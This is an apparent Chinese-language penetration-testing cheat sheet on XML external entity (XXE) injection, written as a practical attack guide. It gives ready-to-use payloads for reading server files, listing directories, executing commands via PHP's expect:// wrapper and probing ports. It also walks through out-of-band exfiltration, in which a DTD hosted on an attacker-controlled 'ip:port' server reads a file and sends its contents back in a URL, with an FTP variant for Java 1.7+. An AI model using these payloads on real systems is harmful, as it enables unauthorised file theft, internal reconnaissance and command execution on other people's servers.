# XXE Injection
---
###漏洞介绍
XXE漏洞可以用于进行文件读取、列目录、SSRF（内网端口探测等）甚至于执行命令（依赖于PHP的环境下的expect扩展）。漏洞一般出现在有XML作为数据传输，并且服务器会将用户输入解析为XML的地方。  

Exaple:  
定义**xxe**，引用**&xxe**  

```
POST /****** HTTP/1.1
*****
*****
*****

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///windows/win.ini">]>
<Search><SearchTerm>&xxe;</SearchTerm></Search>
```

###攻击方式

####爆路径
基本的使用套路是在POST包中加上以下代码，可以爆路径

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY % remote SYSTEM "test">%remote;]>
```

####读文件

使用下面代码：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY % remote SYSTEM "file:///文件路径">%remote;]>
```

若读取的文件中包含<、>、等XML标签符号，是无法正常读取文件内容的。

这边说下php下的解决方案，php中以这样的方式读取文件内容会将文件内容base64编码返回，这就屏蔽了那些XML标签符号，这也是普通php文件读取里常见的套路。

`php://filter/write=convert.base64-decode/resource=`
	
####列目录

根据乌云里很多漏洞的说明，看到一种列目录的方式是，使用`file:///`协议，但是后面不跟上路径：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY % remote SYSTEM "file:///文件路径">%remote;]>
```

这样可以列出目录

####命令执行

针对PHP环境下的expect扩展：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY % remote SYSTEM "expect://命令">%remote;]>
```

####探测端口

可以使用http来访问某个IP的端口，根据回显大致判断是否开启端口
	
####上面几个攻击方式的拓展————引入外部实体方式

以上攻击方式的结果是在有回显的情况下才能看到效果，若是没有回显，也可以使用引入外部实体的方式，具体操作为，在POST请求包中加入以下代码：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://ip:port/1.xml">%remote;]>
```

其中的URL为自己本机或者VPS，本机的话可以使用`python -m SimpleHTTPServer 8080`命令来开启一个简单的HTTP服务器。而`1.xml`的内容如下:

```
<!ENTITY % a SYSTEM "file:///文件路径">
<!ENTITY % b "<!ENTITY % c SYSTEM 'http://ip:port/?log=%a;'>"> %b; %c;
```

第一段代码的意思是让服务器的XML解释器访问URL中的外部实体；第二段代码前一个标签是读取服务器上的文件内容，第二个标签是把读取到的内容作为URL中log的参数，访问这个URL。然后可以在我们的服务器请求日志中看到文件的内容。这就达到了得到回显的目的，这个方法同样适用于列目录、命令执行等。


###报错解决

针对`illegal character in URL`报错问题

这个是存在在`Java1.7+`上，由于这个版本会检查HTTP请求中URL里的非法字符造成，可以通过搭建FTP服务器，在FTP服务器中接收信息。这个版本不检查FTPURL中的非法字符。

[Referer](http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html)